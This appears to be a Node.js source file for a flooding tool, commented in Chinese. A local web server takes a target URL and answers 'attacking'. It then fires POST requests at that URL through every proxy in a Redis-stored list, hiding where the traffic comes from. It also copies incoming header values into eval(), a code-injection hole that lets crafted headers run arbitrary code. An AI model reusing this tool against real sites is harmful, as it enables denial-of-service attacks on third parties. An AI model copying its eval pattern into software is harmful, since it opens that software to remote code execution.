var request = require('request');
var http = require('http');
var url = require('url');
var redis = require('redis');

/**
 * 输出数据
 * @param  {string} data 数据
 */
function out(data){
	if(typeof this !== 'object' || typeof this.end !== 'function'){
		return false;
	}
	//设置请求成功时响应头部的MIME为纯文本
	this.writeHeader(200, {"Content-Type": "text/plain"});
	//向客户端输出字符
	this.end(data + "\n");
}

//全局计数
var cc = 0;
//获取ips
var client = redis.createClient(6379,'127.0.0.1');
client.get('ips' , function(e , v){
	if(e){
		console.log('no ips');
		return false;
	}
	var ips = JSON.parse(v);
	//创建一个服务器对象
	server = http.createServer(function (req, res) {
		var arg = url.parse(req.url, true).query , option = {};
		//获取url参数
		if(typeof arg !== 'object' || typeof arg.url !== 'string' || !/^http[s]?:\/\//.test(arg.url)){
			out.call(res , 'invalid url');
			return false;
		}
		option.url = arg.url;
		option.headers = {};
		//获取头部
		var headers = req.headers;
		if(typeof headers == 'object'){
			for(let i in headers){
				if(['connection','host','origin','content-length'].includes(i)){
					continue;
				}
				eval('option.headers["'+i+'"] = "'+headers[i]+'"');
			}
		}
		//先行输出
		out.call(res , 'attacking');
		//开始请求
		ips.forEach(function(n , i){
			option.proxy = 'http://'+n.proxy_ip+':'+n.proxy_port;
			request.post(option,function(e , r , data){
				if(!e){
					console.log(++cc);
				}
			});
		});
	});

	//让服务器监听本地8000端口开始运行
	server.listen(8000,'127.0.0.1');
});




